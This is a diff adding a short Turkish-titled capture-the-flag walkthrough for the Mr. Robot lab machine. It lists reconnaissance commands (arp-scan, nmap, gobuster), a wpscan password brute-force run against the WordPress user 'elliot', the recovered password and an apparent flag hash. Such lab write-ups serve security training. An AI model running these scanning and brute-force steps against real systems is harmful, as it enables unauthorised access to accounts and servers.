@@ -1,0 +1,11 @@
+MR.ROBOT MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.68 bulundu.
+2 - nmap -sT -A 192.168.2.68
+3 - http://192.168.2.68/robots.txt
+4 - gobuster dir -u http://192.168.2.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+5 - sort fsocity.dic | uniq >> fsocity_filtered.dic
+6 - wpscan --url http://192.168.2.68 --passwords fsocity_filtered.dic --usernames elliot
+7 - elliot : ER28-0652
+
+
+073403c8a58a1f80d943455fb30724b9
